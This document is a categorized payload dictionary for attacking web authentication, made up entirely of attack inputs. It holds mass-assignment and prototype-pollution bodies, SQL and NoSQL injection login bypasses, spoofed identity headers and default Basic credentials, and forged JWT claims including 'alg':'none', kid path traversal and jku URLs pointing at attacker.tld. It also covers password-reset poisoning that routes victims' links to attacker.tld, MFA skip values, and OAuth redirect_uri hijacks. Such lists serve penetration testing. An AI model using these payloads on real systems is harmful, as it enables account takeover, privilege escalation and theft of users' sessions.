# Payload dictionary — the auth corpus

Categorized request bodies, headers, and tokens. Send through the real
mechanism (form body, JSON, header) — the shape matters more than the bytes.

---

## 1. Registration / mass-assign extras

```json
{"role":"admin"},{"role":"Administrator"},{"role":"admin","verified":true}
{"role":"superuser"},{"role":"staff"},{"role":"root"},{"role":"system"}
{"isAdmin":true},{"is_admin":true},{"admin":true},{"administrator":true}
{"isStaff":true},{"is_staff":true},{"isSuperuser":true},{"is_superuser":true}
{"superuser":true},{"staff":true},{"sudo":true},{"su":true}
{"verified":true},{"email_verified":true},{"emailVerified":true}
{"active":true},{"enabled":true},{"approved":true},{"confirmed":true}
{"balance":999999},{"credits":999999},{"score":999999},{"level":99}
{"permissions":["*"]},{"permissions":["admin"]},{"perms":["*"]}
{"scope":"*"},{"scope":"admin"},{"scopes":["*"]},{"scopes":["admin"]}
{"groups":["admin"]},{"groups":["root"]},{"privileges":["admin"]}
{"tier":"admin"},{"plan":"admin"},{"plan":"enterprise"},{"level":"admin"}
{"id":1},{"uid":1},{"user_id":1},{"userId":1},{"accountId":1},{"tenantId":1}
{"orgId":1},{"ownerId":1},{"createdBy":1},{"company_id":1}
{"__proto__":{"isAdmin":true}},{"__proto__":{"role":"admin"}}
{"constructor":{"prototype":{"isAdmin":true}}}
{"constructor":{"prototype":{"role":"admin"}}}
{"__proto__.isAdmin":true},{"__proto__.role":"admin"}
{"user":{"role":"admin"}},{"data":{"role":"admin"}}
{"input":{"role":"admin"}},{"user":{"isAdmin":true}}
{"attrs":{"role":"admin"}},{"fields":{"role":"admin"}}
{"settings":{"role":"admin"}},{"options":{"role":"admin"}}
{"metadata":{"role":"admin"}},{"extra":{"role":"admin"}}
{"password":"x","confirm_password":"x","_method":"PUT","role":"admin"}
```

## 2. Login bodies — bypass shapes

```json
{"username":"admin","password":"admin"}
{"username":"admin'--","password":"x"}
{"username":"admin'-- -","password":"x"}
{"username":"admin'#","password":"x"}
{"username":"admin'/*","password":"x"}
{"username":"admin' OR '1'='1'--","password":"x"}
{"username":"admin' OR '1'='1'#","password":"x"}
{"username":"' OR 1=1--","password":"x"}
{"username":"' OR 1=1#","password":"x"}
{"username":"admin","password":"' OR '1'='1'--"}
{"username":"admin","password":{"$ne":null}}
{"username":"admin","password":{"$ne":""}}
{"username":"admin","password":{"$gt":""}}
{"username":"admin","password":{"$gte":""}}
{"username":"admin","password":{"$regex":".*"}}
{"username":"admin","password":{"$exists":true}}
{"username":{"$eq":"admin"},"password":{"$ne":null}}
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$where":"true"}}
{"username":"admin","password":{"$or":[{},{}]}}
{"username":"admin","password":true}
{"username":"admin","password":1}
{"username":"admin","password":0}
{"username":"admin","password":[]}
{"username":"admin","password":{}}
{"username":"admin","password":null}
{"username":"admin","password":[""]}
{"username":"admin","password":["x"]}
{"username":["admin"],"password":["x"]}
{"username":{"$regex":"^admin"},"password":{"$regex":"^."}}
{"username":{"$regex":"adm.*"},"password":{"$regex":".*"}}
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^admin"}}
{"username":"admin","password":{"$type":2}}
{"username":"admin","password":{"$not":{"$eq":""}}}
{"username":"admin","password":{"$nin":[]}}
{"username":"admin","password":{"$in":["x"]}}
{"username":"admin","password":{"$all":[]}}
{"username":"admin","password":{"$size":0}}
{"username":"admin","password":{"$mod":[1,0]}}
{"username":"admin","password":{"$elemMatch":{}}}
{"username":"admin","password":{"$and":[]}}
{"username":"admin","password":{"$nor":[]}}
{"username":"admin","password":{"$comment":"x"}}
{"username":"admin","password":{"$options":"i"}}
{"username":"admin","password":{"$regex":".*","$options":"i"}}
{"user":"admin","pass":"x"}
{"user":"admin","pass":{"$ne":null}}
{"email":"admin@t.tld","password":{"$ne":null}}
{"email":"admin@t.tld","password":"x' OR '1'='1'--"}
{"login":"admin","password":{"$ne":null}}
{"login":"admin","password":"x' OR '1'='1'--"}
{"uname":"admin","pwd":{"$ne":null}}
{"user":"admin","pwd":{"$ne":null}}
{"name":"admin","pass":{"$ne":null}}
{"account":"admin","password":{"$ne":null}}
{"userid":"admin","password":{"$ne":null}}
{"uid":"admin","password":{"$ne":null}}
{"id":"admin","password":{"$ne":null}}
{"mail":"admin@t.tld","password":{"$ne":null}}
{"username":"admin","password":"x","remember":true}
{"username":"admin","password":"x","remember_me":true}
{"username":"admin","password":"x","grant_type":"password"}
{"username":"admin","password":"x","_method":"POST"}
{"username":"admin","password":"x","isAdmin":true}
{"username":"admin","password":"x","role":"admin"}
{"username":"admin","password":"x","mfa":false}
{"username":"admin","password":"x","mfa_verified":true}
{"username":"admin","password":"x","step":"2"}
{"username":"admin","password":"x","stage":"complete"}
{"username":"admin","password":"x","redirect":"/admin"}
{"username":"admin","password":"x","next":"/admin"}
{"username":"admin","password":"x","callback":"/admin"}
{"username":"admin","password":"x","return":"/admin"}
{"username":"admin","password":"x","returnUrl":"/admin"}
{"username":"admin","password":"x","debug":true}
{"username":"admin","password":"x","test":true}
{"username":"admin","password":"x","admin":true}
{"username":"admin","password":"x","token":""}
{"username":"admin","password":"x","token":null}
{"username":"admin","password":"x","token":0}
{"username":"admin","password":"x","token":false}
{"username":"admin","password":"x","captcha":""}
{"username":"admin","password":"x","captcha":null}
{"username":"admin","password":"x","captcha":"x"}
{"username":"admin","password":"x","g-recaptcha-response":""}
{"username":"admin","password":"x","recaptcha":""}
{"username":"admin","password":"x","otp":""}
{"username":"admin","password":"x","otp":null}
{"username":"admin","password":"x","otp":"000000"}
{"username":"admin","password":"x","2fa":""}
{"username":"admin","password":"x","code":""}
{"username":"admin","password":"x","code":null}
{"username":"admin","password":"x","mfa_code":""}
{"username":"admin","password":"x","mfaCode":""}
{"username":"admin","password":"x","totp":""}
{"username":"admin","password":"x","totp_code":""}
{"username":"admin","password":"x","backup_code":""}
{"username":"admin","password":"x","recovery_code":""}
```

## 3. Bearer / session carriers

```
Authorization: Bearer <token>
Authorization: Token <token>
Authorization: JWT <token>
Authorization: Basic <b64(user:pass)>
Authorization: Basic YWRtaW46YWRtaW4=          # admin:admin
Authorization: Basic YWRtaW46cGFzc3dvcmQ=      # admin:password
Authorization: Basic YWRtaW46MTIzNDU2          # admin:123456
Authorization: Basic cm9vdDpyb290              # root:root
Authorization: Basic dGVzdDp0ZXN0              # test:test
Authorization: Basic ZGVtbzpkZW1v              # demo:demo
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=          # guest:guest
X-Auth-Token: <token>
X-Api-Key: <token>
X-Access-Token: <token>
X-Session-Token: <token>
X-Session-Id: <token>
X-User-Id: 1
X-User: admin
X-Role: admin
X-Admin: true
X-Admin: 1
X-Forwarded-User: admin
X-Remote-User: admin
X-Original-User: admin
X-Real-User: admin
X-Authenticated-User: admin
X-Auth-User: admin
Cookie: session=<token>
Cookie: sid=<token>
Cookie: auth=<token>
Cookie: token=<token>
Cookie: jwt=<token>
Cookie: PHPSESSID=<token>
Cookie: JSESSIONID=<token>
Cookie: connect.sid=<token>
Cookie: sessionid=<token>
Cookie: laravel_session=<token>
Cookie: rack.session=<token>
Cookie: auth_token=<token>
Cookie: access_token=<token>
Cookie: refresh_token=<token>
Cookie: remember_me=<token>
Cookie: remember_token=<token>
Cookie: admin=1
Cookie: admin=true
Cookie: role=admin
Cookie: is_admin=1
Cookie: isAdmin=1
Cookie: logged_in=1
Cookie: authenticated=1
Cookie: auth=1
Cookie: user=admin
Cookie: uid=1
Cookie: user_id=1
Cookie: is_admin=true
Cookie: isAdmin=true
```

## 4. JWT claim payloads

```json
{"sub":"admin"},{"sub":"1"},{"sub":"0"},{"sub":"root"},{"sub":"system"}
{"sub":"administrator"},{"sub":1},{"sub":0},{"sub":"admin'--"}
{"user":"admin"},{"username":"admin"},{"name":"admin"},{"email":"admin@t.tld"}
{"uid":1},{"user_id":1},{"userId":1},{"id":1},{"account_id":1}
{"role":"admin"},{"role":"administrator"},{"role":"root"},{"role":"system"}
{"role":"staff"},{"role":"superuser"},{"roles":["admin"]}
{"groups":["admin"]},{"group":"admin"},{"permissions":["*"]}
{"perms":["*"]},{"scope":"*"},{"scope":"admin"},{"scopes":["*"]}
{"isAdmin":true},{"is_admin":true},{"admin":true},{"isStaff":true}
{"is_staff":true},{"isSuperuser":true},{"is_superuser":true}
{"superuser":true},{"staff":true},{"sudo":true},{"su":true}
{"verified":true},{"email_verified":true},{"active":true},{"enabled":true}
{"approved":true},{"confirmed":true},{"tenant_id":1},{"org_id":1}
{"tenantId":1},{"orgId":1},{"owner_id":1},{"ownerId":1}
{"iat":0},{"iat":9999999999},{"nbf":0},{"nbf":9999999999}
{"exp":9999999999},{"exp":2147483647},{"exp":4102444800}
{"iss":"https://target.tld"},{"iss":"target"},{"aud":"admin"}
{"aud":"target"},{"aud":["target","admin"]},{"jti":"1"}
{"typ":"JWT"},{"alg":"HS256"},{"alg":"none"},{"alg":"None"},{"alg":"NONE"}
{"kid":"../../../../dev/null"},{"kid":"/dev/null"},{"kid":"x"}
{"kid":"../../../../etc/hostname"},{"kid":"../../proc/sys/kernel/randomize_va_space"}
{"kid":"1' UNION SELECT 'x'--"},{"kid":"x|id"}
{"jku":"https://attacker.tld/jwks.json"},{"jku":"http://localhost/jwks.json"}
{"jku":"http://127.0.0.1/jwks.json"},{"jku":"http://[::1]/jwks.json"}
{"jku":"https://attacker.tld@target.tld/jwks.json"}
{"jku":"https://target.tld.attacker.tld/jwks.json"}
{"x5u":"https://attacker.tld/cert.pem"},{"x5c":["<cert>"]}
{"cty":"JWT"},{"crit":["alg"]}
{"zip":"DEF"},{"enc":"A128GCM"}
```

## 5. Password-reset bodies

```json
{"email":"victim@t.tld","email":"attacker@t.tld"}
{"email":["victim@t.tld","attacker@t.tld"]}
{"email":"victim@t.tld,attacker@t.tld"}
{"email":"victim@t.tld attacker@t.tld"}
{"email":"victim@t.tld%0aCc:attacker@t.tld"}
{"email":"victim@t.tld%0d%0aBcc:attacker@t.tld"}
{"email":"victim@t.tld","host":"attacker.tld"}
{"email":"victim@t.tld","domain":"attacker.tld"}
{"email":"victim@t.tld","origin":"attacker.tld"}
{"email":"victim@t.tld","callback":"https://attacker.tld"}
{"email":"victim@t.tld","redirect":"https://attacker.tld"}
{"email":"victim@t.tld","redirect_uri":"https://attacker.tld"}
{"email":"victim@t.tld","redirectUrl":"https://attacker.tld"}
{"email":"victim@t.tld","next":"https://attacker.tld"}
{"email":"victim@t.tld","url":"https://attacker.tld"}
{"email":"victim@t.tld","return_url":"https://attacker.tld"}
{"email":"victim@t.tld","returnUrl":"https://attacker.tld"}
{"email":"victim@t.tld","continue":"https://attacker.tld"}
{"email":"victim@t.tld","goto":"https://attacker.tld"}
{"email":"victim@t.tld","target":"https://attacker.tld"}
{"token":"<yours>","email":"victim@t.tld","new_password":"x"}
{"token":"<yours>","user_id":2,"new_password":"x"}
{"token":"<yours>","uid":2,"new_password":"x"}
{"token":"","email":"victim@t.tld","new_password":"x"}
{"token":null,"email":"victim@t.tld","new_password":"x"}
{"token":0,"email":"victim@t.tld","new_password":"x"}
{"token":"0","email":"victim@t.tld","new_password":"x"}
{"verified":true,"email":"victim@t.tld","new_password":"x"}
{"email":"victim@t.tld","verified":true}
{"email":"victim@t.tld","token_verified":true}
{"email":"victim@t.tld","step":"verify"}
{"email":"victim@t.tld","step":"reset"}
{"email":"victim@t.tld","action":"reset"}
{"email":"victim@t.tld","method":"reset"}
```

## 6. MFA / OTP bodies

```json
{"code":"000000"},{"code":"123456"},{"code":"111111"},{"code":"999999"}
{"code":""},{"code":null},{"code":0},{"code":"0"}
{"code":[]},{"code":{}},{"code":["123456"]}
{"code":{"$ne":null}},{"code":{"$regex":".*"}}
{"otp":"000000"},{"otp":"123456"},{"otp":""},{"otp":null}
{"totp":"000000"},{"totp":"123456"},{"totp":""},{"totp":null}
{"mfa_code":"000000"},{"mfa_code":""},{"mfa_code":null}
{"mfaCode":"000000"},{"mfaCode":""},{"mfaCode":null}
{"2fa":"000000"},{"2fa":""},{"2fa":null}
{"token":"000000"},{"token":"123456"},{"token":""},{"token":null}
{"pin":"0000"},{"pin":"1234"},{"pin":""},{"pin":null}
{"backup_code":""},{"backup_code":null},{"recovery_code":""}
{"recovery_code":null},{"remember_device":true},{"rememberDevice":true}
{"trust_device":true},{"trustDevice":true},{"remember_me":true}
{"skip_mfa":true},{"skipMfa":true},{"mfa_skip":true}
{"mfa_verified":true},{"mfaVerified":true},{"verified":true}
{"step":2},{"stage":"complete"},{"stage":"done"},{"final":true}
{"user_id":2,"code":"123456"},{"uid":2,"code":"123456"}
{"email":"victim@t.tld","code":"<yours>"}
{"code":"<yours>","user":"victim"}
```

## 7. Session / cookie bodies

```json
{"session":"<token>"},{"sid":"<token>"},{"token":"<token>"}
{"jwt":"<token>"},{"auth":"<token>"},{"access_token":"<token>"}
{"refresh_token":"<token>"},{"session_id":"<token>"}
{"sessionid":"<token>"},{"id_token":"<token>"}
{"remember_me":"<token>"},{"remember_token":"<token>"}
{"user_id":1,"session":"<token>"},{"uid":1,"session":"<token>"}
{"id":1,"session":"<token>"},{"session":"<token>","impersonate":"admin"}
{"session":"<token>","switch_user":"admin"},{"session":"<token>","as":"admin"}
{"session":"<token>","sudo":"admin"},{"session":"<token>","su":"admin"}
{"session":"<token>","_switch_user":"admin"}
{"session":"<token>","become":"admin"}
```

## 8. OAuth callback params

```
/oauth/callback?code=X&state=
/oauth/callback?code=X&state=0
/oauth/callback?code=X&state=null
/oauth/callback?code=X
/oauth/callback?code=X&state=<attacker>
/oauth/callback?access_token=X
/oauth/callback?id_token=X
/oauth/callback?token=X
/oauth/callback?code=X&error=
/oauth/callback?error=access_denied&code=X
/callback?code=X&session_state=
/callback?code=X&iss=
/sso/callback?code=X
/auth/callback?code=X
/login/oauth2/code/x?code=X
/authorize?client_id=x&redirect_uri=https%3a%2f%2fattacker.tld&response_type=code
/authorize?client_id=x&redirect_uri=https%3a%2f%2fattacker.tld&response_type=token
/authorize?client_id=x&response_type=id_token&nonce=x
/authorize?client_id=x&redirect_uri=javascript:alert(1)
/authorize?client_id=x&redirect_uri=data:text/html,<script>
/authorize?client_id=x&prompt=none&scope=admin
/authorize?client_id=x&scope=admin+openid
/token?grant_type=authorization_code&code=X&redirect_uri=...
/token?grant_type=password&username=victim&password=x
/token?grant_type=client_credentials&scope=admin
/token?grant_type=refresh_token&refresh_token=X
/token?assertion=X&grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer
/token?grant_type=urn:ietf:params:oauth:grant-type:saml2-bearer&assertion=X
```
